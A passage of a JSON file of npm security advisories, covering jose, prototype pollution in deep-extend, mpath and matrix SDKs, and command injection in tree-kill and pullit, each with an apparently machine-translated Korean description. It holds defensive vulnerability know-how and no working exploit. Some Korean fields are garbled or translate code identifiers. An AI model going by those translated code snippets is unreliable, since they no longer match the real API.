JWE decryption API)\n- Your code only accepts JWEs produced by trusted sources\n- Your code limits the accepted JWE Key Management Algorithms using the `keyManagementAlgorithms` decryption option not including any of the PBKDF2-based JWE key management algorithms\n\n### Patches\n\n`v1.28.2`, `v2.0.6`, `v3.20.4`, and `v4.9.2` releases limit the maximum PBKDF2 iteration count to `10000` by default. It is possible to adjust this limit with a newly introduced `maxPBES2Count` decryption option.\n\n### Workarounds\n\nAll users should be able to upgrade given all stable semver major release lines have had new a patch release introduced which limits the PBKDF2 iteration count to `10000` by default. This removes the ability to craft JWEs that would consume unreasonable amount of CPU time.\n\nIf users are unable to upgrade their required library version they have two options depending on whether they expect to receive JWEs using any of the three PBKDF2-based JWE key management algorithms.\n\n- they can use the `keyManagementAlgorithms` decryption option to disable accepting PBKDF2 altogether\n- they can inspect the JOSE Header prior to using the decryption API and limit the PBKDF2 iteration count (`p2c` Header Parameter)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an discussion in the project's [repository](https://github.com/panva/jose/discussions/new?category=q-a&title=GHSA-jv3g-j58f-9mq9%20advisory%20question)\n* Email me at [panva.ip@gmail.com](mailto:panva.ip@gmail.com)\n",
    "identifiers": "GHSA : GHSA-jv3g-j58f-9mq9\nCVE : CVE-2022-36083",
    "severity": "MODERATE",
    "updatedAt": "2023-07-21T21:33:36Z",
    "publishedAt": "2022-09-16T17:44:42Z",
    "references": "https://github.com/panva/jose/security/advisories/GHSA-jv3g-j58f-9mq9\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-36083\nhttps://github.com/panva/jose/commit/03d6d013bf6e070e85adfe5731f526978e3e8e4d\nhttps://github.com/panva/jose/releases/tag/v4.9.2\nhttps://github.com/advisories/GHSA-jv3g-j58f-9mq9",
    "name": "jose",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 1.0.0, <= 1.28.1",
    "identifier": "1.28.2",
    "descriptionKR": "PBKDF2 기반 JWE 키 관리 알고리즘은 'p2c'([PBES2 개수](https://www.rfc-editor.org/rfc/rfc7518.html#section-4.8.1.2))라는 JOSE 헤더 매개변수를 예상합니다. CEK 래핑 키를 파생시키기 위해 실행해야 하는 PBKDF2 반복 횟수를 결정합니다. 이 매개변수의 목적은 의도적으로 키 파생 기능을 느리게 하여 암호 무차별 대입 공격과 사전 공격의 비용을 높이는 것입니다.\n\n이로 인해 PBES2 알고리즘은 JWE가 신뢰할 수 없는 소스에서 오는 상황에 부적합합니다. 공격자는 의도적으로 매우 높은 PBES2 카운트 값을 선택할 수 있으며, 이 값은 완료하는 데 비합리적인 시간이 걸릴 수 있는 CPU 바운드 계산을 시작합니다.\n\n### 영향\n\n특정 조건(아래 참조)에서 사용자 환경이 비합리적인 양의 CPU 시간을 소비하도록 할 수 있습니다.\n\n### 영향을 받는 사용자\n\n영향은 'keyManagementAlgorithms'(또는 v1의 'algorithms')를 사용하여 허용된 JWE 키 관리 알고리즘('alg' 헤더 매개변수)을 제한하지 않는 신뢰할 수 없는 당사자로부터 JWE를 해독하기 위해 대칭 비밀이 있는 JWE 암호 해독 API를 사용하는 사용자에게만 제한됩니다. .x) 암호 해독 옵션 또는 기타 수단을 통해.\n\nPBKDF2 기반 JWE 키 관리 알고리즘 식별자는 다음과 같습니다.\n\n- `PBES2-HS256+A128KW`\n- `PBES2-HS384+A192KW`\n- `PBES2-HS512+A256KW`\n\n예를 들어\n\n```js\nconst secret = new Uint8Array(16)\nconst jwe = '...' // 신뢰할 수 없는 당사자의 JWE\n\nawait jose.compactDecrypt(jwe, 비밀)\n```\n\n다음 중 하나라도 해당되는 경우 영향을 받지 않습니다.\n\n- 귀하의 코드는 JWE API를 사용하지 않습니다.\n- 귀하의 코드는 JWE 토큰만 생성합니다.\n- 귀하의 코드는 비대칭 JWE 키 관리 알고리즘을 사용하여 JWE만 해독합니다(즉, JWE 해독 API에 비대칭 키 객체를 제공한다는 의미입니다).\n- 귀하의 코드는 신뢰할 수 있는 소스에서 생성된 JWE만 허용합니다.\n- 귀하의 코드는 PBKDF2 기반 JWE 키 관리 알고리즘을 포함하지 않는 'keyManagementAlgorithms' 암호 해독 옵션을 사용하여 허용되는 JWE 키 관리 알고리즘을 제한합니다.\n\n### 패치\n\n`v1.28.2`, `v2.0.6`, `v3.20.4` 및 `v4.9.2` 릴리스는 기본적으로 최대 PBKDF2 반복 횟수를 `10000`으로 제한합니다. 새로 도입된 'maxPBES2Count' 복호화 옵션으로 이 제한을 조정할 수 있습니다.\n\n### 해결 방법\n\n모든 안정적인 semver 주요 릴리스 라인에 기본적으로 PBKDF2 반복 횟수를 '10000'으로 제한하는 새로운 패치 릴리스가 도입된 경우 모든 사용자가 업그레이드할 수 있어야 합니다. 이렇게 하면 부당한 양의 CPU 시간을 소비하는 JWE를 만드는 기능이 제거됩니다.\n\n사용자가 필요한 라이브러리 버전을 업그레이드할 수 없는 경우 세 가지 PBKDF2 기반 JWE 키 관리 알고리즘 중 하나를 사용하여 JWE를 수신할지 여부에 따라 두 가지 옵션이 있습니다.\n\n- `keyManagementAlgorithms` 암호 해독 옵션을 사용하여 PBKDF2 수락을 완전히 비활성화할 수 있습니다.\n- 암호 해독 API를 사용하기 전에 JOSE 헤더를 검사하고 PBKDF2 반복 횟수(`p2c` 헤더 매개변수)를 제한할 수 있습니다.\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n* 프로젝트의 [저장소](https://github.com/panva/jose/discussions/new?category=q-a&title=GHSA-jv3g-j58f-9mq9%20advisory%20question)에서 토론 열기\n* [panva.ip@gmail.com](mailto:panva.ip@gmail.com)으로 이메일을 보내주세요."
  },
  {
    "description": "Versions of `deep-extend` before 0.5.1 are vulnerable to prototype pollution.\n\n\n## Recommendation\n\nUpdate to version 0.5.1 or later.",
    "identifiers": "GHSA : GHSA-hr2v-3952-633q\nCVE : CVE-2018-3750",
    "severity": "CRITICAL",
    "updatedAt": "2023-03-30T22:48:38Z",
    "publishedAt": "2018-10-09T00:44:59Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2018-3750\nhttps://hackerone.com/reports/311333\nhttps://github.com/advisories/GHSA-hr2v-3952-633q\nhttps://www.npmjs.com/advisories/612\nhttps://github.com/unclechu/node-deep-extend/commit/9423fae877e2ab6b4aecc4db79a0ed63039d4703",
    "name": "deep-extend",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.5.1",
    "identifier": "0.5.1",
    "descriptionKR": "0.5.1 이전의 `deep-extend` 버전은 프로토타입 오염에 취약합니다.\n\n\n## 추천\n\n버전 0.5.1 이상으로 업데이트하십시오."
  },
  {
    "description": "All versions of bson before 1.1.4 are vulnerable to Deserialization of Untrusted Data. The package will ignore an unknown value for an object's _bsontype, leading to cases where an object is serialized as a document rather than the intended BSON type.",
    "identifiers": "GHSA : GHSA-v8w9-2789-6hhr\nCVE : CVE-2020-7610",
    "severity": "CRITICAL",
    "updatedAt": "2023-03-30T22:46:25Z",
    "publishedAt": "2021-05-07T16:04:54Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-7610\nhttps://snyk.io/vuln/SNYK-JS-BSON-561052\nhttps://github.com/mongodb/js-bson/commit/3809c1313a7b2a8001065f0271199df9fa3d16a8\nhttps://github.com/advisories/GHSA-v8w9-2789-6hhr",
    "name": "bson",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.1.4",
    "identifier": "1.1.4",
    "descriptionKR": "1.1.4 이전의 모든 bson 버전은 신뢰할 수 없는 데이터의 역직렬화에 취약합니다. 패키지는 개체의 _bsontype에 대한 알 수 없는 값을 무시하므로 개체가 의도한 BSON 유형이 아닌 문서로 직렬화되는 경우가 발생합니다."
  },
  {
    "description": "This affects the package mpath before 0.8.4. A type confusion vulnerability can lead to a bypass of CVE-2018-16490. In particular, the condition ignoreProperties.indexOf(parts[i]) !== -1 returns -1 if parts[i] is ['__proto__']. This is because the method that has been called if the input is an array is Array.prototype.indexOf() and not String.prototype.indexOf(). They behave differently depending on the type of the input.",
    "identifiers": "GHSA : GHSA-p92x-r36w-9395\nCVE : CVE-2021-23438",
    "severity": "MODERATE",
    "updatedAt": "2023-03-30T22:42:11Z",
    "publishedAt": "2021-09-02T22:02:25Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-23438\nhttps://github.com/aheckmann/mpath/commit/89402d2880d4ea3518480a8c9847c541f2d824fc\nhttps://snyk.io/vuln/SNYK-JS-MPATH-1577289\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1579548\nhttps://github.com/mongoosejs/mpath/commit/89402d2880d4ea3518480a8c9847c541f2d824fc\nhttps://github.com/advisories/GHSA-p92x-r36w-9395",
    "name": "mpath",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.8.4",
    "identifier": "0.8.4",
    "descriptionKR": "이것은 0.8.4 이전의 패키지 mpath에 영향을 미칩니다. 유형 혼동 취약점으로 인해 CVE-2018-16490을 우회할 수 있습니다. 특히, ignoreProperties.indexOf(parts[i]) !== -1 조건은 parts[i]가 ['__proto__']인 경우 -1을 반환합니다. 입력이 배열인 경우 호출된 메서드가 String.prototype.indexOf()가 아니라 Array.prototype.indexOf()이기 때문입니다. 입력 유형에 따라 다르게 동작합니다."
  },
  {
    "description": "Versions of `cryptiles` prior to 4.1.2 are vulnerable to Insufficient Entropy. The `randomDigits()` method does not provide sufficient entropy and its generates digits that are not evenly distributed.\n\n\n## Recommendation\n\nUpgrade to version 4.1.2. The package is deprecated and has been moved to `@hapi/cryptiles` and it is strongly recommended to use the maintained package.",
    "identifiers": "GHSA : GHSA-rq8g-5pc5-wrhr\nCVE : CVE-2018-1000620",
    "severity": "CRITICAL",
    "updatedAt": "2023-03-31T21:46:12Z",
    "publishedAt": "2018-09-11T18:22:50Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2018-1000620\nhttps://github.com/hapijs/cryptiles/issues/34\nhttps://github.com/advisories/GHSA-rq8g-5pc5-wrhr\nhttps://github.com/nodejs/security-wg/blob/master/vuln/npm/476.json\nhttps://www.npmjs.com/advisories/720\nhttps://www.npmjs.com/advisories/1464\nhttps://github.com/hapijs/cryptiles/commit/9332d4263a32b84e76bf538d7470d01ea63fa047\nhttps://github.com/hapijs/cryptiles/issues/35",
    "name": "cryptiles",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.1.2",
    "identifier": "4.1.2",
    "descriptionKR": "4.1.2 이전의 'cryptiles' 버전은 불충분한 엔트로피에 취약합니다. `randomDigits()` 메서드는 충분한 엔트로피를 제공하지 않으며 균등하게 분포되지 않은 숫자를 생성합니다.\n\n\n## 추천\n\n버전 4.1.2로 업그레이드하십시오. 패키지는 더 이상 사용되지 않으며 `@hapi/cryptiles`로 이동되었으며 유지 관리되는 패키지를 사용하는 것이 좋습니다."
  },
  {
    "description": "Versions of `tree-kill` prior to 1.2.2 are vulnerable to Command Injection. The package fails to sanitize values passed to the  `kill` function. If this value is user-controlled it  may allow attackers to run arbitrary commands in the server. The issue only affects Windows systems.\n\n\n## Recommendation\n\nUpgrade to version 1.2.2 or later.",
    "identifiers": "GHSA : GHSA-884p-74jh-xrg2",
    "severity": "HIGH",
    "updatedAt": "2023-03-30T21:46:35Z",
    "publishedAt": "2020-09-04T16:57:20Z",
    "references": "https://hackerone.com/reports/701183\nhttps://www.npmjs.com/advisories/1432\nhttps://github.com/pkrumins/node-tree-kill/commit/deee138a8cbc918463d8af5ce8c2bec33c3fd164\nhttps://github.com/advisories/GHSA-884p-74jh-xrg2",
    "name": "tree-kill",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.2.2",
    "identifier": "1.2.2",
    "descriptionKR": "1.2.2 이전의 `tree-kill` 버전은 명령 주입에 취약합니다. 패키지가 `kill` 함수에 전달된 값을 삭제하지 못했습니다. 이 값이 사용자가 제어하는 ​​경우 공격자가 서버에서 임의의 명령을 실행할 수 있습니다. 이 문제는 Windows 시스템에만 영향을 미칩니다.\n\n\n## 추천\n\n버전 1.2.2 이상으로 업그레이드하십시오."
  },
  {
    "description": "### Impact\n\nIn certain configurations, data sent by remote servers containing special strings in key locations could cause modifications of the `Object.prototype`, disrupting matrix-js-sdk functionality, causing denial of service and potentially affecting program logic.\n\n(This is part 2, where [CVE-2022-36059](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36059) / [GHSA-rfv9-x7hh-xc32](https://github.com/matrix-org/matrix-js-sdk/security/advisories/GHSA-rfv9-x7hh-xc32) is part 1. Part 2 covers remaining vectors not covered by part 1, found in a codebase audit scheduled after part 1.)\n\n### Patches\nThe issue has been patched in matrix-js-sdk 24.0.0.\n\n### Workarounds\nNone.\n\n### References\n\n- [Release blog post](https://matrix.org/blog/2023/03/28/security-releases-matrix-js-sdk-24-0-0-and-matrix-react-sdk-3-69-0)\n- The advisory [GHSA-rfv9-x7hh-xc32](https://github.com/matrix-org/matrix-js-sdk/security/advisories/GHSA-rfv9-x7hh-xc32) ([CVE-2022-36059](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36059)) refers to an initial set of vulnerable locations discovered and patched in matrix-js-sdk 19.4.0. We opted not to disclose that advisory while we performed an audit of the codebase and are now disclosing it jointly with this one.\n\n### For more information\nIf you have any questions or comments about this advisory please email us at [security at matrix.org](mailto:security@matrix.org).\n",
    "identifiers": "GHSA : GHSA-mwq8-fjpf-c2gr\nCVE : CVE-2023-28427",
    "severity": "HIGH",
    "updatedAt": "2023-05-30T06:44:16Z",
    "publishedAt": "2023-03-30T20:19:18Z",
    "references": "https://github.com/matrix-org/matrix-js-sdk/security/advisories/GHSA-mwq8-fjpf-c2gr\nhttps://github.com/matrix-org/matrix-js-sdk/security/advisories/GHSA-rfv9-x7hh-xc32\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-28427\nhttps://matrix.org/blog/2023/03/28/security-releases-matrix-js-sdk-24-0-0-and-matrix-react-sdk-3-69-0\nhttps://lists.debian.org/debian-lts-announce/2023/04/msg00027.html\nhttps://www.debian.org/security/2023/dsa-5392\nhttps://security.gentoo.org/glsa/202305-36\nhttps://github.com/advisories/GHSA-mwq8-fjpf-c2gr",
    "name": "matrix-js-sdk",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 24.0.0",
    "identifier": "24.0.0",
    "descriptionKR": "### 영향\n\n특정 구성에서 주요 위치에 특수 문자열을 포함하는 원격 서버에서 보낸 데이터는 `Object.prototype`을 수정하여 matrix-js-sdk 기능을 방해하여 서비스 거부를 유발하고 잠재적으로 프로그램 논리에 영향을 미칠 수 있습니다.\n\n(이것은 [CVE-2022-36059](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36059) / [GHSA-rfv9-x7hh-xc32] 파트 2입니다. ](https://github.com/matrix-org/matrix-js-sdk/security/advisories/GHSA-rfv9-x7hh-xc32)는 1부입니다. 2부에서는 1부에서 다루지 않은 나머지 벡터를 다룹니다. 1부 이후에 예정된 코드베이스 감사)\n\n### 패치\n이 문제는 matrix-js-sdk 24.0.0에서 패치되었습니다.\n\n### 해결 방법\n없음.\n\n### 참조\n\n- [출시 블로그 게시물](https://matrix.org/blog/2023/03/28/security-releases-matrix-js-sdk-24-0-0-and-matrix-react-sdk-3-69 -0)\n- 권고 [GHSA-rfv9-x7hh-xc32](https://github.com/matrix-org/matrix-js-sdk/security/advisories/GHSA-rfv9-x7hh-xc32) ([CVE-2022-36059 ](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36059))는 matrix-js-sdk 19.4.0에서 발견 및 패치된 초기 취약 위치 집합을 나타냅니다. 우리는 코드베이스 감사를 수행하는 동안 해당 권고를 공개하지 않기로 결정했으며 현재 이 권고와 함께 공개하고 있습니다.\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우 [security at matrix.org](mailto:security@matrix.org)로 이메일을 보내주십시오."
  },
  {
    "description": "### Impact\nIn certain configurations, data sent by remote servers containing special strings in key locations could cause modifications of the `Object.prototype`, disrupting matrix-react-sdk functionality, causing denial of service and potentially affecting program logic.\n\n(This is part 2, where [CVE-2022-36060](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36060) / [GHSA-2x9c-qwgf-94xr](https://github.com/matrix-org/matrix-react-sdk/security/advisories/GHSA-2x9c-qwgf-94xr) is part 1. Part 2 covers remaining vectors not covered by part 1, found in a codebase audit scheduled after part 1.)\n\n### Patches\nThis is fixed in matrix-react-sdk 3.69.0\n\n### Workarounds\nNone.\n\n### References\n\n- [Release blog post](https://matrix.org/blog/2023/03/28/security-releases-matrix-js-sdk-24-0-0-and-matrix-react-sdk-3-69-0)\n- The advisory [GHSA-2x9c-qwgf-94xr](https://github.com/matrix-org/matrix-react-sdk/security/advisories/GHSA-2x9c-qwgf-94xr) ([CVE-2022-36060](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36060)) refers to an initial set of vulnerable locations discovered and patched in matrix-react-sdk 3.53.0. We opted not to disclose that advisory while we performed an audit of the codebase and are now disclosing it jointly with this one.\n\n### For more information\nIf you have any questions or comments about this advisory please email us at [security at matrix.org](mailto:security@matrix.org).",
    "identifiers": "GHSA : GHSA-6g43-88cp-w5gv\nCVE : CVE-2023-28103",
    "severity": "HIGH",
    "updatedAt": "2023-03-29T19:34:28Z",
    "publishedAt": "2023-03-29T19:34:25Z",
    "references": "https://github.com/matrix-org/matrix-react-sdk/security/advisories/GHSA-2x9c-qwgf-94xr\nhttps://github.com/matrix-org/matrix-react-sdk/security/advisories/GHSA-6g43-88cp-w5gv\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-28103\nhttps://matrix.org/blog/2023/03/28/security-releases-matrix-js-sdk-24-0-0-and-matrix-react-sdk-3-69-0\nhttps://github.com/advisories/GHSA-6g43-88cp-w5gv",
    "name": "matrix-react-sdk",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.69.0",
    "identifier": "3.69.0",
    "descriptionKR": "### 영향\n특정 구성에서 주요 위치에 특수 문자열을 포함하는 원격 서버에서 보낸 데이터는 `Object.prototype`을 수정하여 matrix-react-sdk 기능을 방해하고 서비스 거부를 유발하고 잠재적으로 프로그램 논리에 영향을 미칠 수 있습니다.\n\n(이 부분은 [CVE-2022-36060](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36060) / [GHSA-2x9c-qwgf-94xr ](https://github.com/matrix-org/matrix-react-sdk/security/advisories/GHSA-2x9c-qwgf-94xr)는 1부입니다. 2부에서는 1부에서 다루지 않은 나머지 벡터를 다룹니다. 1부 이후에 예정된 코드베이스 감사)\n\n### 패치\n이것은 matrix-react-sdk 3.69.0에서 수정되었습니다.\n\n### 해결 방법\n없음.\n\n### 참조\n\n- [출시 블로그 게시물](https://matrix.org/blog/2023/03/28/security-releases-matrix-js-sdk-24-0-0-and-matrix-react-sdk-3-69 -0)\n- 권고 [GHSA-2x9c-qwgf-94xr](https://github.com/matrix-org/matrix-react-sdk/security/advisories/GHSA-2x9c-qwgf-94xr) ([CVE-2022-36060 ](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36060))은 matrix-react-sdk 3.53.0에서 발견 및 패치된 초기 취약 위치 집합을 나타냅니다. 우리는 코드베이스 감사를 수행하는 동안 해당 권고를 공개하지 않기로 결정했으며 현재 이 권고와 함께 공개하고 있습니다.\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우 [security at matrix.org](mailto:security@matrix.org)로 이메일을 보내주십시오."
  },
  {
    "description": "taro is vulnerable to Inefficient Regular Expression Complexity",
    "identifiers": "GHSA : GHSA-468q-v4jj-485h\nCVE : CVE-2021-3804",
    "severity": "HIGH",
    "updatedAt": "2023-03-29T14:49:30Z",
    "publishedAt": "2021-09-20T20:09:59Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-3804\nhttps://github.com/nervjs/taro/commit/acadb6c826ba57f2030a626f1de4f7b4608fcdb5\nhttps://huntr.dev/bounties/0ebe85e6-cc85-42b8-957e-18d8df277414\nhttps://github.com/advisories/GHSA-468q-v4jj-485h",
    "name": "@tarojs/helper",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.3.9",
    "identifier": "3.3.9",
    "descriptionKR": "taro는 비효율적인 정규식 복잡성에 취약합니다."
  },
  {
    "description": "nodejs-tmpl is simple string formatting. tmpl is vulnerable to Inefficient Regular Expression Complexity which may lead to resource exhaustion.",
    "identifiers": "GHSA : GHSA-jgrx-mgxx-jf9v\nCVE : CVE-2021-3777",
    "severity": "HIGH",
    "updatedAt": "2023-03-29T05:07:29Z",
    "publishedAt": "2021-09-20T20:27:52Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-3777\nhttps://github.com/daaku/nodejs-tmpl/commit/4c654e4d1542f329ed561fd95ccd80f30c6872d6\nhttps://huntr.dev/bounties/a07b547a-f457-41c9-9d89-ee48bee8a4df\nhttps://github.com/advisories/GHSA-jgrx-mgxx-jf9v",
    "name": "tmpl",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.0.5",
    "identifier": "1.0.5",
    "descriptionKR": "nodejs-tmpl은 간단한 문자열 형식입니다. tmpl은 리소스 고갈로 이어질 수 있는 비효율적인 정규식 복잡성에 취약합니다."
  },
  {
    "description": "### Impact\nEvents sent with special strings in key places can temporarily disrupt or impede the matrix-react-sdk from functioning properly, such as by causing room or event tile crashes. The remainder of the application can appear functional, though certain rooms/events will not be rendered.\n\n### Patches\nThis is fixed in matrix-react-sdk 3.53.0\n\n### Workarounds\nThere are no workarounds. Please upgrade immediately.\n\n### References\nhttps://learn.snyk.io/lessons/prototype-pollution/javascript/\n\n### For more information\nIf you have any questions or comments about this advisory please email us at [security at matrix.org](mailto:security@matrix.org).\n",
    "identifiers": "GHSA : GHSA-2x9c-qwgf-94xr\nCVE : CVE-2022-36060",
    "severity": "HIGH",
    "updatedAt": "2023-03-28T23:09:14Z",
    "publishedAt": "2023-03-28T19:57:57Z",
    "references": "https://github.com/matrix-org/matrix-react-sdk/security/advisories/GHSA-2x9c-qwgf-94xr\nhttps://github.com/matrix-org/matrix-react-sdk/releases/tag/v3.53.0\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-36060\nhttps://github.com/advisories/GHSA-2x9c-qwgf-94xr",
    "name": "matrix-react-sdk",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.53.0",
    "identifier": "3.53.0",
    "descriptionKR": "### 영향\n주요 위치에서 특수 문자열과 함께 전송된 이벤트는 방 또는 이벤트 타일 충돌을 유발하는 등 일시적으로 matrix-react-sdk가 제대로 작동하는 것을 방해하거나 방해할 수 있습니다. 애플리케이션의 나머지 부분은 작동하는 것처럼 보일 수 있지만 특정 룸/이벤트는 렌더링되지 않습니다.\n\n### 패치\n이것은 matrix-react-sdk 3.53.0에서 수정되었습니다.\n\n### 해결 방법\n해결 방법이 없습니다. 즉시 업그레이드하십시오.\n\n### 참조\nhttps://learn.snyk.io/lessons/prototype-pollution/javascript/\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우 [security at matrix.org](mailto:security@matrix.org)로 이메일을 보내주십시오."
  },
  {
    "description": "### Impact\nEvents sent with special strings in key places can temporarily disrupt or impede the matrix-js-sdk from functioning properly, potentially impacting the consumer's ability to process data safely. Note that the matrix-js-sdk can appear to be operating normally but be excluding or corrupting runtime data presented to the consumer.\n\n### Patches\nThis is fixed in matrix-js-sdk 19.4.0.\n\n### Workarounds\nRedacting applicable events, waiting for the sync processor to store data, and restarting the client can often fix it. Alternatively, redacting the applicable events and clearing all storage will often fix most perceived issues.\n\nIn some cases, no workarounds are possible.\n\n### References\nhttps://learn.snyk.io/lessons/prototype-pollution/javascript/\n\n### For more information\nIf you have any questions or comments about this advisory please email us at [security at matrix.org](mailto:security@matrix.org).\n",
    "identifiers": "GHSA : GHSA-rfv9-x7hh-xc32\nCVE : CVE-2022-36059",
    "severity": "HIGH",
    "updatedAt": "2023-03-28T23:09:01Z",
    "publishedAt": "2023-03-28T18:59:28Z",
    "references": "https://github.com/matrix-org/matrix-js-sdk/security/advisories/GHSA-rfv9-x7hh-xc32\nhttps://github.com/matrix-org/matrix-js-sdk/releases/tag/v19.4.0\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-36059\nhttps://github.com/advisories/GHSA-rfv9-x7hh-xc32",
    "name": "matrix-js-sdk",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 19.4.0",
    "identifier": "19.4.0",
    "descriptionKR": "### 영향\n주요 위치에서 특수 문자열과 함께 전송된 이벤트는 일시적으로 matrix-js-sdk가 제대로 작동하는 것을 방해하거나 방해하여 잠재적으로 데이터를 안전하게 처리하는 소비자의 능력에 영향을 미칠 수 있습니다. matrix-js-sdk는 정상적으로 작동하는 것처럼 보일 수 있지만 소비자에게 제공되는 런타임 데이터를 제외하거나 손상시킬 수 있습니다.\n\n### 패치\n이는 matrix-js-sdk 19.4.0에서 수정되었습니다.\n\n### 해결 방법\n적용 가능한 이벤트를 수정하고, 동기화 프로세서가 데이터를 저장하기를 기다리고, 클라이언트를 다시 시작하면 종종 문제를 해결할 수 있습니다. 또는 해당 이벤트를 수정하고 모든 저장소를 지우면 대부분의 인식된 문제가 해결됩니다.\n\n어떤 경우에는 해결 방법이 없습니다.\n\n### 참조\nhttps://learn.snyk.io/lessons/prototype-pollution/javascript/\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우 [security at matrix.org](mailto:security@matrix.org)로 이메일을 보내주십시오."
  },
  {
    "description": "## Duplicate Advisory\nThis advisory has been withdrawn because it is a duplicate of [GHSA-8px5-63x9-5c7p](https://github.com/advisories/GHSA-8px5-63x9-5c7p). This link is maintained to preserve external references.\n\n## Original Description\nThe pullit package before 1.4.0 for Node.js allows OS Command Injection because `eval()` is used on an attacker-supplied Git branch name.",
    "identifiers": "GHSA : GHSA-2w9p-xf5h-qwj3",
    "severity": "HIGH",
    "updatedAt": "2023-03-28T23:17:21Z",
    "publishedAt": "2023-03-27T03:30:16Z",
    "withdrawnAt": "2023-03-28T23:17:20Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2018-25083\nhttps://github.com/jkup/pullit/commit/4fec455774ee08f4dce0ef2ef934ffcc37219bfb\nhttps://security.snyk.io/vuln/npm:pullit:20180214\nhttps://github.com/advisories/GHSA-2w9p-xf5h-qwj3",
    "name": "pullit",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.4.0",
    "descriptionKR": "## 중복 자문\n이 권고는 [GHSA-8px5-63x9-5c7p](https://github.com/advisories/GHSA-8px5-63x9-5c7p)와 중복되므로 철회되었습니다. 이 링크는 외부 참조를 보존하기 위해 유지됩니다.\n\n## 원본 설명\nNode.js용 1.4.0 이전의 pullit 패키지는 'eval()'이 공격자가 제공한 Git 분기 이름에 사용되기 때문에 OS 명령 주입을 허용합니다."
  },
  {
    "description": "### Impact\nangular-server-side-configuration detects used environment variables in TypeScript (.ts) files during build time of an Angular CLI project. The detected environment variables are written to a ngssc.json file in the output directory.\nDuring deployment of an Angular based app, the environment variables based on the variables from ngssc.json are inserted into the apps index.html (or defined index file).\n\nWith version 15 the environment variable detection was widened to the entire project, relative to the angular.json file from the Angular CLI. In a monorepo setup, this could lead to environment variables intended for a backend/service to be detected and written to the ngssc.json, which would then be populated and exposed via index.html.\n\nThis has NO IMPACT, in a plain Angular project that has no backend component.\n\n### Patches\nVulnerability has been mitigated in 15.1.0, by adding an option `searchPattern` which restricts the detection file range by default.\n\n```bash\n# Update via npm\nnpm update angular-server-side-configuration\n## Or more specific\nnpm install angular-server-side-configuration@15.1.0\n\n# Update via pnpm\npnpm update angular-server-side-configuration\n## Or more specific\npnpm add angular-server-side-configuration@15.1.0\n\n# Update via yarn\nyarn update angular-server-side-configuration\n## Or more specific\nyarn add angular-server-side-configuration@15.1.0\n```\n\n### Workarounds\nManually edit or create ngssc.json or run a script after ngssc.json generation\n\n### References\n\n ",
    "identifiers": "GHSA : GHSA-gwvm-vrp4-4pp5\nCVE : CVE-2023-28444",
    "severity": "CRITICAL",
    "updatedAt": "2023-03-24T22:05:35Z",
    "publishedAt": "2023-03-24T22:04:35Z",
    "references": "https://github.com/kyubisation/angular-server-side-configuration/security/advisories/GHSA-gwvm-vrp4-4pp5\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-28444\nhttps://github.com/kyubisation/angular-server-side-configuration/commit/d701f51260637a84ede278e248934e0437a7ff86\nhttps://github.com/kyubisation/angular-server-side-configuration/releases/tag/v15.1.0\nhttps://github.com/advisories/GHSA-gwvm-vrp4-4pp5",
    "name": "angular-server-side-configuration",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 15.0.0, < 15.1.0",
    "identifier": "15.1.0",
